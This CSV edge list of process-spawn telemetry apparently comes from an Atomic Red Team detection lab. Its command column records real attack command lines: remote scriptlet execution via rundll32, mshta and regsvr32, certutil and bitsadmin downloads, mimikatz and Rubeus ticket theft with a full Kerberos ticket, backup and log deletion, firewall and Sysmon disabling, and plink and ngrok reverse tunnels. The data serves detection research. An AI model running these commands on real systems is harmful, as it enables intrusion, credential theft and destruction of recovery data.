Source,Target,Type,Weight,Commands
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/rundll32.exe,spawned,14,"C:\Windows\System32\rundll32.exe  C:\evil.dll | rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();  | rundll32  vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)  | rundll32.exe  advpack.dll,LaunchINFSection C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf,DefaultInstall_SingleUser,1,  | rundll32.exe  setupapi.dll,InstallHinfSection DefaultInstall 128 .\C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf "
proc::c:/windows/system32/cmd.exe,proc::c:/users/admini~1/appdata/local/temp/temp_t1027.zip/t1027.exe,spawned,1,"""C:\Users\ADMINI~1\AppData\Local\Temp\temp_T1027.zip\T1027.exe""  "
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/taskkill.exe,spawned,1,taskkill  /f /im calculator.exe  
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/curl.exe,spawned,2,curl  -L %%31%%30%%2E%%30%%2e%%31%%2e%%31%%34/%%79%%61%%6D%%6C%%6c%%69%%6E%%74%%2E%%79%%6d%%6C -o lol2.txt | curl  -L %%31%%30%%2E%%30%%2e%%31%%2e%%31%%34/%%79%%61%%6D%%6C%%6c%%69%%6E%%74%%2E%%79%%6d%%6C -o lol.txt
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/find.exe,spawned,3,"find  /v ""console""  | find  /v ""#""  | Find  ""C:\Program Files\WinRAR\th.exe""  "
proc::c:/windows/system32/cmd.exe,proc::c:/users/administrator/appdata/roaming/taskhostw.exe,spawned,1,C:\Users\Administrator\AppData\Roaming\taskhostw.exe  
proc::c:/windows/system32/cmd.exe,proc::c:/users/administrator/appdata/roaming/svchost.exe,spawned,1,C:\Users\Administrator\AppData\Roaming\svchost.exe  /B 
proc::c:/windows/system32/cmd.exe,proc::c:/users/administrator/appdata/roaming/notepad.exe,spawned,1,C:\Users\Administrator\AppData\Roaming\notepad.exe  /B 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/temp/lsass.exe,spawned,1,C:\Windows\Temp\lsass.exe  /B 
proc::c:/windows/system32/cmd.exe,proc::c:/users/admini~1/appdata/local/temp/t1036.003_masquerading.ps1.exe,spawned,1,C:\Users\ADMINI~1\AppData\Local\Temp\T1036.003_masquerading.ps1.exe  
proc::c:/windows/system32/cmd.exe,proc::c:/users/admini~1/appdata/local/temp/t1036.003_masquerading.pdf.exe,spawned,1,C:\Users\ADMINI~1\AppData\Local\Temp\T1036.003_masquerading.pdf.exe  
proc::c:/windows/system32/cmd.exe,proc::c:/users/admini~1/appdata/local/temp/t1036.003_masquerading.docx.exe,spawned,1,C:\Users\ADMINI~1\AppData\Local\Temp\T1036.003_masquerading.docx.exe  
proc::c:/windows/system32/cmd.exe,proc::c:/lsm.exe,spawned,1,C:\lsm.exe  /c echo T1036.003  
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/wscript.exe,spawned,8,"""C:\Windows\System32\WScript.exe"" ""C:\Users\ADMINI~1\AppData\Local\Temp\T1036.003_masquerading.png.vbs""   | ""C:\Windows\System32\WScript.exe"" ""C:\Users\ADMINI~1\AppData\Local\Temp\T1036.003_masquerading.xlsx.vbs""   | ""C:\Windows\System32\WScript.exe"" ""C:\Users\ADMINI~1\AppData\Local\Temp\T1036.003_masquerading.xls.vbs""   | ""C:\Windows\System32\WScript.exe"" ""C:\Temp\exfil.js""  | ""C:\Windows\System32\WScript.exe"" ""C:\Temp\exfil.js"" "
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/wbem/scrcons.exe,spawned,2,scrcons.exe | scrcons.exe
proc::c:/windows/system32/cmd.exe,proc::c:/cygwin64/bin/cut.exe,spawned,4,cut  -d ' ' -f1 | cut  -d ' ' -f1 | cut  -d ' ' -f1 | cut  -d ' ' -f1
proc::c:/windows/system32/cmd.exe,proc::c:/cygwin64/bin/hostname.exe,spawned,5,hostname  -I  | hostname  -I  | hostname  -I  | hostname  -I  | hostname  -I 
proc::c:/windows/system32/cmd.exe,proc::c:/python27/scripts/pip2.exe,spawned,4,pip2  install socket.py | pip2  install sockets | pip2  install socket | pip2  install sockey
proc::c:/windows/system32/cmd.exe,proc::c:/program files/python38/scripts/pip.exe,spawned,1,pip  install socket
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/hostname.exe,spawned,4,hostname  -I  | hostname  -I  | hostname  -I  | hostname  
proc::c:/windows/system32/cmd.exe,proc::c:/python27/python.exe,spawned,5,python.exe  c:\Temp\minidns.py | python.exe  c:\Temp\minidns.py | python.exe | c:\Python27\python.exe  minidns.py | c:\Python27\python.exe  minidns.py\
proc::c:/windows/system32/cmd.exe,proc::c:/python27/scripts/pip.exe,spawned,2,pip  install subprocess | pip  install subprocess
proc::c:/windows/system32/cmd.exe,proc::c:/program files/python38/python.exe,spawned,3,python  minidns.py | python  exfil.py | python
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/regsvr32.exe,spawned,9,regsvr32  amsi-tracer.dll | regsvr32  amsi-tracer.dll | C:\Windows\system32\regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll  | C:\Windows\system32\regsvr32.exe  /s /u /i:C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct scrobj.dll  | C:\Windows\system32\regsvr32.exe  /s C:\Users\Administrator\AppData\Local\Temp\chocolatey\shell32.jpg 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/doskey.exe,spawned,1,"doskey  git=""C:\Program Files\Git\cmd\git.exe"" $*"
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/at.exe,spawned,2,at  \\10.0.1.15 14:00 C:\metE.exe | at  \\10.0.1.15 1 /delete
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/rasautou.exe,spawned,2,rasautou  -d C:\users\Administrator\Desktop\duedllgence.dll -p powershell -a a -e e | rasautou  -d C:\users\Administrator\Desktop\duedllgence.cpl -p powershell -a a -e e
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/mshta.exe,spawned,6,mshta.exe  javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()  | mshta.exe  javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()  | mshta.exe  javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()  | mshta.exe  javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()  | mshta.exe  javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close() 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/windowspowershell/v1.0/lvn8meo.exe,spawned,4,lVN8MeO.exe  -  | lVN8MeO.exe  -  | lVN8MeO.exe  -  | lVN8MeO.exe  - 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/dsquery.exe,spawned,6,"dsquery  * -filter ""(objectClass=trustedDomain)"" -attr *  | dsquery  * -filter ""(objectClass=trustedDomain)"" -attr *  | dsquery  * -filter ""(objectClass=trustedDomain)"" -attr *  | dsquery  user | dsquery  user"
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/where.exe,spawned,3,WHERE  nltest.exe   | WHERE  nltest.exe   | WHERE  nltest.exe  
proc::c:/windows/system32/cmd.exe,proc::c:/temp/sharphound.exe,spawned,2,c:\temp\sharphound.exe  --CollectionMethod all | c:\temp\sharphound.exe  -c all
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/cscript.exe,spawned,3,cscript.exe  /B | cscript.exe  /B | CScript.exe  AtomicTestT1105.js //E:JScript 
proc::c:/windows/system32/cmd.exe,proc::c:/users/public/qkumydzsplan.exe,spawned,1,C:\users\Public\QKumYdZSplan.exe  8 LAN
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/conhost.exe,spawned,20,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/wevtutil.exe,spawned,1,wevtutil  cl System 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/fsutil.exe,spawned,2,fsutil  usn deletejournal /D C:  | fsutil  usn createjournal m=1000 a=100 c: 
proc::c:/windows/system32/cmd.exe,proc::c:/program files/ansible/sysmon/sysmon.exe,spawned,2,"Sysmon.exe  -h | Sysmon.exe  -c ""C:\Program Files\ansible\AttackRangeSysmon.xml"""
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/mmc.exe,spawned,1,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\wbadmin.msc""  delete catalog -quiet"
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/bcdedit.exe,spawned,12,bcdedit  /set {default} recoveryenabled no  | bcdedit  /set {default} bootstatuspolicy ignoreallfailures  | bcdedit.exe  /set {default} recoveryenabled no  | bcdedit.exe  /set {default} bootstatuspolicy ignoreallfailures  | bcdedit.exe  /set {default} recoveryenabled no 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/systeminfo.exe,spawned,2,systeminfo   | systeminfo
proc::c:/windows/system32/cmd.exe,proc::c:/program files/ansible/sysmon/sysmon64.exe,spawned,12,"Sysmon64.exe  -c ""C:\Program Files\ansible\AttackRangeSysmon.xml"" | Sysmon64.exe  -c ""C:\Program Files\ansible\AttackRangeSysmon.xml"" | Sysmon64.exe  -c ""C:\Program Files\ansible\AttackRangeSysmon.xml"" | Sysmon64.exe  -c  | Sysmon64.exe  -c ""C:\Program Files\ansible\AttackRangeSysmon.xml"""
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/gpupdate.exe,spawned,2,gpupdate  force | gpupdate  /force
proc::c:/windows/system32/cmd.exe,proc::c:/users/admin/desktop/tor browser/browser/torbrowser/tor/tor.exe,spawned,1,tor.exe
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/certutil.exe,spawned,4,"certutil  -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt""   | certutil  /url http://7-zip.org/a/7z1604-x64.exe | certutil  -decode C:\Users\ADMINI~1\AppData\Local\Temp\2\T1140_calc.txt C:\Users\ADMINI~1\AppData\Local\Temp\2\T1140_calc_decoded.exe  | certutil  -encode C:\Windows\System32\calc.exe C:\Users\ADMINI~1\AppData\Local\Temp\2\T1140_calc.txt "
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/bitsadmin.exe,spawned,7,"C:\Windows\System32\bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\ADMINI~1\AppData\Local\Temp\2\Atomic-license.txt  | bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\ADMINI~1\AppData\Local\Temp\bitsadmin1_flag.ps1  | bitsadmin.exe  /resume AtomicBITS  | bitsadmin.exe  /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe """"  | bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\ADMINI~1\AppData\Local\Temp\bitsadmin3_flag.ps1 "
proc::c:/windows/system32/cmd.exe,proc::c:/programdata/microsoft/windows defender/platform/4.18.2010.7-0/mpcmdrun.exe,spawned,1,MpCmdRun.exe  -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\Users\ADMINI~1\AppData\Local\Temp\2\Atomic-license.txt 
proc::c:/windows/system32/cmd.exe,proc::c:/svchost.exe,spawned,1,C:\svchost.exe  /c echo T1105  
proc::c:/windows/system32/cmd.exe,proc::c:/temp/notmsbuild.exe,spawned,1,C:\Temp\notmsbuild.exe  c:\Temp\T1127.001.txt 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/microsoft.net/framework/v4.0.30319/msbuild.exe,spawned,2,C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe  C:\AtomicRedTeam\atomics\T1127.001\src\T1127.001.csproj  | Cmd.exe /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\programdata\1.txt - p:GLrxSR=c:\programdata\2.txt -p:jScMSf=e60362957c6c10431120b8fe35a7eef86b970ec5ba0f5e0036bf9cb8e20bb902
proc::c:/windows/system32/cmd.exe,proc::c:/temp/msbuild.exe,spawned,1,c:\temp\msbuild.exe  C:\AtomicRedTeam\atomics\T1127.001\src\T1127.001.csproj 
proc::c:/windows/system32/cmd.exe,proc::c:/users/admini~1/appdata/local/temp/2/tcm.tmp,spawned,2,C:\Users\ADMINI~1\AppData\Local\Temp\2\tcm.tmp  -decode C:\Users\ADMINI~1\AppData\Local\Temp\2\T1140_calc2.txt C:\Users\ADMINI~1\AppData\Local\Temp\2\T1140_calc2_decoded.exe  | C:\Users\ADMINI~1\AppData\Local\Temp\2\tcm.tmp  -encode C:\Windows\System32\calc.exe C:\Users\ADMINI~1\AppData\Local\Temp\2\T1140_calc2.txt 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/timeout.exe,spawned,5,timeout  5  | timeout  /t 2  | timeout  /t 3  | timeout  /t 2  | timeout  /t 3 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/pcalua.exe,spawned,2,pcalua.exe  -a C:\Windows\System32\calc.exe | pcalua.exe  -a calc.exe 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/forfiles.exe,spawned,1,forfiles  /p c:\windows\system32 /m notepad.exe /c calc.exe
proc::c:/windows/system32/cmd.exe,proc::c:/program files/splunkuniversalforwarder/bin/splunkd.exe,spawned,2,splunkd  local-rest-uri -p 8089 | splunkd  local-rest-uri -p 8089
proc::c:/windows/system32/cmd.exe,proc::c:/windows/hh.exe,spawned,2,hh.exe  C:\AtomicRedTeam\atomics\T1218.001\src\T1218.001.chm  | hh.exe  https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/control.exe,spawned,2,control.exe  C:\AtomicRedTeam\atomics\T1218.002\bin\calc.cpl  | control.exe  c:\users\administrator\appdata\local\temp\docusign.cpl 
proc::c:/windows/system32/cmd.exe,proc::c:/temp/msiexec.exe,spawned,2,"c:\temp\msiexec.exe  /q /i ""C:\AtomicRedTeam\atomics\T1218.007\src\T1218.007_JScript.msi"" | c:\temp\msiexec.exe  /q /i ""C:\AtomicRedTeam\atomics\T1218.007\src\T1218.007_JScript.msi"""
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/msiexec.exe,spawned,8,"c:\windows\system32\msiexec.exe  /q /i ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/T1218.007_JScript.msi"" | c:\windows\system32\msiexec.exe  /z ""C:\AtomicRedTeam\atomics\T1218.007\src\MSIRunner.dll"" | c:\windows\system32\msiexec.exe  /y ""C:\AtomicRedTeam\atomics\T1218.007\src\MSIRunner.dll"" | c:\windows\system32\msiexec.exe  /q /i ""C:\AtomicRedTeam\atomics\T1218.007\src\T1218.007_EXE.msi"" | c:\windows\system32\msiexec.exe  /q /i ""C:\AtomicRedTeam\atomics\T1218.007\src\T1218.007_DLL.msi"""
proc::c:/windows/system32/cmd.exe,proc::c:/windows/microsoft.net/framework/v4.0.30319/regasm.exe,spawned,1,C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe  /U C:\Users\ADMINI~1\AppData\Local\Temp\2\T1218.009.dll 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/microsoft.net/framework/v4.0.30319/csc.exe,spawned,1,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /r:System.EnterpriseServices.dll /out:""C:\Users\ADMINI~1\AppData\Local\Temp\2\T1218.009.dll"" /target:library C:\AtomicRedTeam\atomics\T1218.009\src\T1218.009.cs "
proc::c:/windows/system32/cmd.exe,proc::c:/windows/syswow64/regsvr32.exe,spawned,3,C:\Windows\syswow64\regsvr32.exe  /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll | C:\Windows\syswow64\regsvr32.exe  /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll | C:\Windows\syswow64\regsvr32.exe  /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll
proc::c:/windows/system32/cmd.exe,proc::c:/temp/notregsvr32.exe,spawned,3,C:\Temp\notregsvr32.exe  /s /u /i:c:\Temp\RegSvr32.txt scrobj.dll  | C:\Temp\notregsvr32.exe  /s C:\Users\ADMINI~1\AppData\Local\Temp\shell32.jpg  | C:\Temp\notregsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll 
proc::c:/windows/system32/cmd.exe,proc::c:/temp/notrundll32.exe,spawned,6,"c:\temp\notrundll32.exe  C:\payloads\beacon.dll,Start | c:\temp\notrundll32.exe  C:\payloads\beacon.dll,StartW | c:\temp\notrundll32.exe  C:\payloads\beacon.dll,Start | c:\temp\notrundll32.exe  C:\payloads\beacon.dll,StartW | c:\temp\notrundll32.exe  C:\payloads\beacon.dll,DllRegisterServer"
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/mavinject.exe,spawned,1,mavinject.exe  1000 /INJECTRUNNING C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/attrib.exe,spawned,7,attrib.exe  +r C:\Users\ADMINI~1\AppData\Local\Temp\T1222.001_attrib\T1222.001_attrib2.txt  | attrib.exe  +r C:\Users\ADMINI~1\AppData\Local\Temp\T1222.001_attrib\T1222.001_attrib1.txt  | attrib.exe  +h C:\Users\ADMINI~1\AppData\Local\Temp\T1222.001_attrib_2\T1222.001_attrib2.txt  | attrib.exe  +h C:\Users\ADMINI~1\AppData\Local\Temp\T1222.001_attrib_2\T1222.001_attrib1.txt  | attrib.exe  -r C:\Users\ADMINI~1\AppData\Local\Temp\T1222.001_attrib\*.* /s 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/icacls.exe,spawned,3,icacls.exe  C:\Users\ADMINI~1\AppData\Local\Temp\T1222.001_cacls /grant Everyone:F  | icacls  C:\Windows\System32\sethc.exe /grant Administrators:F /t  | icacls  C:\Windows\System32\sethc.exe /grant Administrators:F /t 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/takeown.exe,spawned,3,takeown.exe  /f C:\Users\ADMINI~1\AppData\Local\Temp\T1222.001_takeown_folder /r  | takeown  /F C:\Windows\System32\sethc.exe /A  | takeown  /F C:\Windows\System32\sethc.exe /A 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/wbadmin.exe,spawned,2,wbadmin  delete catalog -quiet  | wbadmin  delete systemstatebackup -keepVersions:0 
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/sdbinst.exe,spawned,2,sdbinst.exe  C:\AtomicRedTeam\atomics\T1546.011\bin\AtomicShimx86.sdb  | sdbinst.exe  -u C:\AtomicRedTeam\atomics\T1546.011\bin\AtomicShimx86.sdb  
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/fodhelper.exe,spawned,1,fodhelper.exe  
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/mode.com,spawned,2,"mode  18,1 | mode  18,1"
proc::c:/windows/system32/cmd.exe,proc::c:/temp/test/virus.exe,spawned,1,C:\temp\test\virus.exe 
proc::c:/windows/system32/cmd.exe,proc::c:/tools/x64/mimikatz.exe,spawned,4,"mimikatz.exe  ""privilege::debug"" ""sekurlsa::tickets /export"" | mimikatz.exe  ""privilege::debug"" ""sekurlsa::tickets /export"" | mimikatz.exe  ""kerberos:ptt [0;133115ef]-2-0-40e10000-Administrator@krbtgt-ATTACKRANGE.LOCAL.kirbi"" | mimikatz.exe  ""kerberos::ptt [0;133115ef]-2-0-40e10000-Administrator@krbtgt-ATTACKRANGE.LOCAL.kirbi"""
proc::c:/windows/system32/cmd.exe,proc::c:/tools/psexec64.exe,spawned,1,.\PsExec64.exe  -accepteula \\win-dc-128.attackrange.local cmd
proc::c:/windows/system32/cmd.exe,proc::c:/tools/rubeus.exe,spawned,3,Rubeus.exe  monitor /interval:5  /targetuser:administrator /nowrap | Rubeus.exe  ptt /ticket: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 | Rubeus.exe  kerberoast
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/runas.exe,spawned,1,Runas  /user:attackrange\administrator cmd.exe
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/klist.exe,spawned,2,klist  purge | klist  purge
proc::c:/windows/system32/cmd.exe,proc::c:/temp/not7z.exe,spawned,1,c:\temp\not7z.exe  u archive.7z *txt -pblue
proc::c:/windows/system32/cmd.exe,proc::c:/temp/winrar.exe,spawned,1,c:\temp\winrar.exe  /S
proc::c:/windows/system32/cmd.exe,proc::c:/temp/notrar.exe,spawned,1,c:\temp\notrar.exe  a -hpblue hello.rar
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/fltmc.exe,spawned,1,fltmc.exe  unload SysmonDrv
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/netsh.exe,spawned,9,"netsh  firewall set opmode disable | netsh  advfirewall set  currentprofile state off | netsh  advfirewall firewall add rule name=""atomic testing"" action=allow dir=in protocol=TCP localport=450  | netsh  advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes  | netsh  advfirewall firewall set rule group=""remote desktop"" new enable=Yes "
proc::c:/windows/system32/cmd.exe,proc::c:/windows/system32/choice.exe,spawned,1,choice  /C Y /N /D Y /T 20 
proc::c:/windows/system32/cmd.exe,proc::c:/temp/notps.exe,spawned,1,c:\temp\notps.exe  -accepteula -c wmic process call create notepad.exe
proc::c:/windows/system32/cmd.exe,proc::c:/users/administrator/downloads/ngrok-v3-stable-windows-amd64/ngrok.exe,spawned,7,ngrok.exe  tcp 3389 --cidr-allow 0.0.0.0/32 | ngrok.exe  tcp 3389 --cidr-allow 0.0.0.0/32 | ngrok.exe  http 80 | ngrok.exe  http 80 | ngrok.exe  http 80
proc::c:/windows/system32/cmd.exe,proc::c:/users/administrator/downloads/plink_32.exe,spawned,2,plink_32.exe  -N -T -R 0.0.0.0:1251:127.0.0.1:3389 example.com -P 22 -l forward -pw Socks@123 -no-antispoof | plink_32.exe
proc::c:/windows/system32/cmd.exe,proc::c:/users/administrator/downloads/plink.exe,spawned,1,plink.exe  -N -T -R 0.0.0.0:1251:127.0.0.1:3389 example.com -P 22 -l forward -pw Socks@123 -no-antispoof
